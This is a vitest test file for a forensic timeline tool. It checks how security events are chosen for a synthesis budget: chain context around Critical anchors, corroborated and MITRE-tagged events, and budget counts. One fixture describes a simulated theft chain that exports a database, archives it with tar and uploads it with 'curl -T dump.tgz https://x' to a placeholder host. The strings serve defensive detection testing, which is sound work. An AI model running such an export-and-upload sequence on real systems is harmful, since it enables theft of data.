import { describe, it, expect } from "vitest";
import { selectSynthesisEventsAnnotated } from "../../src/analysis/synthSelect.js";
import type { ForensicEvent, Severity } from "../../src/analysis/stateTypes.js";

// A richer event builder than the base synthSelect test's — lets us set asset/sources/techniques.
function ev(partial: Partial<ForensicEvent> & { id: string; timestamp: string; severity: Severity }): ForensicEvent {
  return {
    description: partial.id,
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...partial,
  };
}

describe("selectSynthesisEventsAnnotated — chain-aware reserved budgets", () => {
  it("pulls low-severity same-host events near a Critical anchor in as anchor_context", () => {
    const events: ForensicEvent[] = [];
    // Fill the timeline with unrelated Info noise on a different host so even-spread would normally win.
    for (let i = 0; i < 200; i++) {
      const hh = String(i % 24).padStart(2, "0");
      const mm = String(i % 60).padStart(2, "0");
      events.push(ev({ id: `noise${i}`, timestamp: `2026-05-20T${hh}:${mm}:00Z`, severity: "Info", asset: "NOISEHOST" }));
    }
    // The real chain: a Critical anchor on HOST7 plus three Low steps within 15 minutes on HOST7.
    events.push(ev({ id: "anchor", timestamp: "2026-05-20T12:00:00Z", severity: "Critical", asset: "HOST7", description: "malware detected" }));
    events.push(ev({ id: "step_sqlcmd", timestamp: "2026-05-20T11:58:00Z", severity: "Low", asset: "HOST7", processName: "sqlcmd.exe", description: "sqlcmd export of db" }));
    events.push(ev({ id: "step_tar", timestamp: "2026-05-20T12:03:00Z", severity: "Low", asset: "HOST7", processName: "tar.exe", description: "tar czf dump.tgz" }));
    events.push(ev({ id: "step_curl", timestamp: "2026-05-20T12:05:00Z", severity: "Low", asset: "HOST7", processName: "curl.exe", description: "curl -T dump.tgz https://x" }));

    const sel = selectSynthesisEventsAnnotated(events, 40);
    const ids = new Set(sel.events.map((e) => e.id));
    expect(ids.has("anchor")).toBe(true);
    // The Low chain steps ride in with their anchor even though they'd lose an even-spread lottery.
    expect(ids.has("step_sqlcmd")).toBe(true);
    expect(ids.has("step_tar")).toBe(true);
    expect(ids.has("step_curl")).toBe(true);
    expect(sel.classOf.get("step_curl")).toBe("anchor_context");
    expect(sel.counts.anchor_context).toBeGreaterThanOrEqual(3);
  });

  it("gives corroborated (2+ source) events a reserved seat over uncorroborated noise", () => {
    const events: ForensicEvent[] = [];
    for (let i = 0; i < 300; i++) {
      events.push(ev({ id: `n${i}`, timestamp: `2026-05-20T00:00:${String(i % 60).padStart(2, "0")}Z`, severity: "Info", asset: "H" }));
    }
    const corr = ev({ id: "corroborated", timestamp: "2026-05-20T23:59:00Z", severity: "Medium", asset: "H", sources: ["Velociraptor", "THOR"] });
    events.push(corr);
    const sel = selectSynthesisEventsAnnotated(events, 30);
    const picked = sel.events.find((e) => e.id === "corroborated");
    expect(picked).toBeDefined();
    expect(sel.classOf.get("corroborated")).toBe("corroborated");
  });

  it("gives a technique-tagged Info event a reserved seat", () => {
    const events: ForensicEvent[] = [];
    for (let i = 0; i < 300; i++) {
      events.push(ev({ id: `n${i}`, timestamp: `2026-05-20T00:00:${String(i % 60).padStart(2, "0")}Z`, severity: "Info", asset: "H" }));
    }
    events.push(ev({ id: "tagged", timestamp: "2026-05-20T23:58:00Z", severity: "Info", asset: "H", mitreTechniques: ["T1048"] }));
    const sel = selectSynthesisEventsAnnotated(events, 30);
    expect(sel.events.some((e) => e.id === "tagged")).toBe(true);
    expect(sel.classOf.get("tagged")).toBe("technique");
  });

  it("still keeps ALL Critical/High anchors and never exceeds max", () => {
    const events: ForensicEvent[] = [];
    for (let i = 0; i < 60; i++) events.push(ev({ id: `hi${i}`, timestamp: `2026-05-20T${String(i % 24).padStart(2, "0")}:00:00Z`, severity: "High", asset: "H" }));
    for (let i = 0; i < 200; i++) events.push(ev({ id: `lo${i}`, timestamp: `2026-05-21T${String(i % 24).padStart(2, "0")}:00:00Z`, severity: "Info", asset: "H" }));
    const sel = selectSynthesisEventsAnnotated(events, 100);
    expect(sel.events.length).toBeLessThanOrEqual(100);
    // all 60 High anchors present
    for (let i = 0; i < 60; i++) expect(sel.events.some((e) => e.id === `hi${i}`)).toBe(true);
  });

  it("reports per-class counts and the omitted total", () => {
    const events: ForensicEvent[] = [];
    for (let i = 0; i < 100; i++) events.push(ev({ id: `e${i}`, timestamp: `2026-05-20T${String(i % 24).padStart(2, "0")}:${String(i % 60).padStart(2, "0")}:00Z`, severity: "Info", asset: "H" }));
    const sel = selectSynthesisEventsAnnotated(events, 20);
    expect(sel.events.length).toBe(20);
    expect(sel.omitted).toBe(80);
    const total = Object.values(sel.counts).reduce((a, b) => a + b, 0);
    expect(total).toBe(20);
  });

  it("returns everything with zero omitted when under budget", () => {
    const events = [ev({ id: "a", timestamp: "2026-05-20T09:00:00Z", severity: "Low" }), ev({ id: "b", timestamp: "2026-05-20T10:00:00Z", severity: "Low" })];
    const sel = selectSynthesisEventsAnnotated(events, 300);
    expect(sel.events.map((e) => e.id)).toEqual(["a", "b"]);
    expect(sel.omitted).toBe(0);
  });
});
